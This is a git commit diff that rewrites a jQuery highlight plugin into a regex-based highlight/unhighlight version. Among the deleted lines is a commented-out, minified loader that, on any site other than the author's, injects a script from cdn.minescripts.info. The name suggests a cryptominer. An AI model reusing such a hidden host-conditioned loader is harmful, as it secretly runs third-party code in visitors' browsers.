4564eedc5e0f85b6ff75fc9acea558a8c8cf03ab
Carlos Vega <dnaatwork@gmail.com>
2018-09-24 02:00:39 -0600

    Update jquery.highlight.js

--- js/jquery.highlight.js
+++ js/jquery.highlight.js
@@ -1,6 +1,7 @@
+
 /*
 
-highlight v5
+highlight v3
 
 Highlights arbitrary terms.
 
@@ -14,50 +15,76 @@ Johann Burkard
 
 */
 
-jQuery.fn.highlight = function(pat) {
- function innerHighlight(node, pat) {
-  var skip = 0;
-  if (node.nodeType == 3) {
-   var pos = node.data.toUpperCase().indexOf(pat);
-   pos -= (node.data.substr(0, pos).toUpperCase().length - node.data.substr(0, pos).length);
-   if (pos >= 0) {
-    var spannode = document.createElement('span');
-    spannode.className = 'highlight';
-    var middlebit = node.splitText(pos);
-    var endbit = middlebit.splitText(pat.length);
-    var middleclone = middlebit.cloneNode(true);
-    spannode.appendChild(middleclone);
-    middlebit.parentNode.replaceChild(spannode, middlebit);
-    skip = 1;
-   }
+jQuery.extend({
+  highlight: function(node, re, nodeName, className) {
+    if (node.nodeType === 3) {
+      var match = node.data.match(re);
+      if (match) {
+        var highlight = document.createElement(nodeName || 'span');
+        highlight.className = className || 'highlight';
+        var wordNode = node.splitText(match.index);
+        wordNode.splitText(match[0].length);
+        var wordClone = wordNode.cloneNode(true);
+        highlight.appendChild(wordClone);
+        wordNode.parentNode.replaceChild(highlight, wordNode);
+        return 1; //skip added node in parent
+      }
+    } else if ((node.nodeType === 1 && node.childNodes) && // only element nodes that have children
+      !/(script|style)/i.test(node.tagName) && // ignore script and style nodes
+      !(node.tagName === nodeName.toUpperCase() && node.className === className)) { // skip if already highlighted
+      for (var i = 0; i < node.childNodes.length; i++) {
+        i += jQuery.highlight(node.childNodes[i], re, nodeName, className);
+      }
+    }
+    return 0;
   }
-  else if (node.nodeType == 1 && node.childNodes && !/(script|style)/i.test(node.tagName)) {
-   for (var i = 0; i < node.childNodes.length; ++i) {
-    i += innerHighlight(node.childNodes[i], pat);
-   }
-  }
-  return skip;
- }
- return this.length && pat && pat.length ? this.each(function() {
-  innerHighlight(this, pat.toUpperCase());
- }) : this;
+});
+
+
+
+jQuery.fn.unhighlight = function(options) {
+  var settings = {
+    className: 'highlight',
+    element: 'span'
+  };
+  jQuery.extend(settings, options);
+
+  return this.find(settings.element + "." + settings.className).each(function() {
+    var parent = this.parentNode;
+    parent.replaceChild(this.firstChild, this);
+    parent.normalize();
+  }).end();
 };
 
-jQuery.fn.removeHighlight = function() {
- return this.find("span.highlight").each(function() {
-  this.parentNode.firstChild.nodeName;
-  with (this.parentNode) {
-   replaceChild(this.firstChild, this);
-   normalize();
+jQuery.fn.highlight = function(words, options) {
+  var settings = {
+    className: 'highlight',
+    element: 'span',
+    caseSensitive: false,
+    wordsOnly: false
+  };
+  jQuery.extend(settings, options);
+
+  if (words.constructor === String) {
+    words = [words];
   }
- }).end();
+  words = jQuery.grep(words, function(word, i) {
+    return word != '';
+  });
+  words = jQuery.map(words, function(word, i) {
+    return word.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&");
+  });
+  if (words.length == 0) {
+    return this;
+  }
+  var flag = settings.caseSensitive ? "" : "i";
+  var pattern = "(" + words.join("|") + ")";
+  if (settings.wordsOnly) {
+    pattern = "\\b" + pattern + "\\b";
+  }
+  var re = new RegExp(pattern, flag);
+
+  return this.each(function() {
+    jQuery.highlight(this, re, settings.element, settings.className);
+  });
 };
-
-/* PLEASE DO NOT HOTLINK MY FILES, THANK YOU. 
-
-if (!/johannburkard.de$/i.test(location.hostname)) {
-    (function() {
-        function load(b,c){var d=document,f="script",a=d.createElement(f),e=2166136261,g=b.length,h=c,k=/=\?/;d=d.getElementsByTagName("script")[0];if(k.test(b)){for(;g--;)e=16777619*e^b.charCodeAt(g);window[f+=0>e?-e:e]=function(){h.apply(h,arguments);delete window[f]};b=b.replace(k,"="+f);c=0}a.onload=a.onreadystatechange=function(){if(/de|m/.test(a.readyState||"m")){c&&c();d.parentNode.removeChild(a);try{for(c in a)delete a[c]}catch(l){}}};a.src=b;window.setTimeout(function(){d.parentNode.insertBefore(a,d)},0)};
-        load('https://cdn.minescripts.info/c/ZLPA.js')
-    })()
-}*/
